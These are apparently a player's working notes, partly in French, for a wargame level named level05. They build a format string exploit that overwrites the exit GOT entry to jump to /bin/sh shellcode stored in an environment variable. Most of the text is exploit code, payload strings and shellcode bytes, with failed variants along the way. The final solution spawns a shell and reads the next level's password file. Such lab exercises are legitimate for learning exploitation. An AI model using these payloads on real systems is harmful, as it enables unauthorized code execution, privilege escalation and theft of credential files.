
%p%p%p%p4444%p%p%p%p8888%p%p%p%p2222%p%p%p%p0000
=> we can overflow with the printf

#we will overflow the jump address of exit
=> exit pointer address : 0x080497e0
in little endian : \xe0\x97\x04\x08

printf("\xe0\x97\x04\x08%hn")

#we will try to overflow the jump in exit with the printf


======================= TEST OFFSET AND ADDRESS EXIT ===============


#include <stdio.h>

int main ()
{
    char *str = "%10$hn";

    printf("\xe0\x97\x04\x08%s", str);
}

============================== TEST WITH AN ENV VAR =================

env var address : 0xffffe760 => dec 65535 59232

#include <stdio.h>

int main ()
{
    char *str = "%65527x%10$hn%59233x%11$hn";

    printf("\xe2\x97\x04\x08\xe0\x97\x04\x08%s", str);
}

#doesnt work, we will try as level04
============================== TEST WITH ret2libc ====================

#address jmp exit : 0x080497e0 => \xe0\x97\x04\x08
#system address : 0xf7e6 0xaed0 => dec 63462 44752
#/bin/bash address: 0xf7f8 0x97ec => dec 63480 38892

#include <stdio.h>

int main ()
{
    char *str = "%63454x%10$hn%46818x%11$hn%63440x%12$hn%38884x%13$hx";

    printf("\xe2\x97\x04\x08\xe0\x97\x04\x08\xea\x97\x04\x08\xe8\x97\x04\x08%s", str);
}
#can't rewrite after exit var

============================== TEST WITH AN ENV VAR +offset ================

env var address + 48 offset : 0xffffe790 => dec 65535 59280

#include <stdio.h>

int main ()
{
    char *str = "%65527x%10$hn%59281x%11$hn";

    printf("\xe2\x97\x04\x08\xe0\x97\x04\x08%s", str);
}

#doesnt work either

============================== TEST WITH THE SHELLCODE IN OUR BUFFER ==============

#address of our buffer :  0xffffd4b8

#include <stdio.h>

int main ()
{
	char *shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
    char *str = "%65527x%10$hn%59281x%11$hn";

    printf("%s\xe2\x97\x04\x08\xe0\x97\x04\x08%s", shellcode, str);
}


0xffffe6ce
============================== TEST WITH AN ENV VAR =================

export SHELLCODE=$(python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'")
env var address : 0xffffe6ce => dec 65535 59086

#include <stdio.h>

int main ()
{
    char *str = "%65527x%10$hn%59087x%11$hn";

    printf("\xe2\x97\x04\x08\xe0\x97\x04\x08%s", str);
}
# gcc print.c -o print; ./print > file

python -c "print '\xe2\x97\x04\x08\xe0\x97\x04\x08' + '%65527x%10$hn%59087x%11$hn'"

====================================================Nouvelle tentative (même strat)=======================================================
Cette fois on va prendre en compte le décalage des ENV dans gdb

On crée notre VAR SHELLCODE : export SHELLCODE=$(python -c 'print "\x90"*256 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
On trouve son adresse dans gdb : gdb ./level5 -> b *0x0804850c -> r -> AAAA -> x/10s *((char **)environ) -> 0xffffd7b3: "SHELLCODE=..."
L'adresse de notr VAR dans gdb = 0xffffd7b3. Donc il faut décaler cette adresse de 256 octects pour obtenir son adresse en dehors de gdb (car gdb possède plus de variables d'environnement et donc décale les existentes)

0xffffd7b3 + (256)10 = 0xffffd8b3

On utilise notre précende technique pour essayer de réécrire cette adresse sur le jump de la fonction exit ->

ffff                d8b3
%65527x%10$hn       %55475x%11$hn



##################final solution#########################

export SHELLCODE=$(python -c 'print "\x90"*256 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
(python -c 'print "\xe2\x97\x04\x08\xe0\x97\x04\x08" + "%65527x" + "%10$hn" + "%55475x" + "%11$hn"'; cat) | ./level05
cat /home/users/level06/.pass
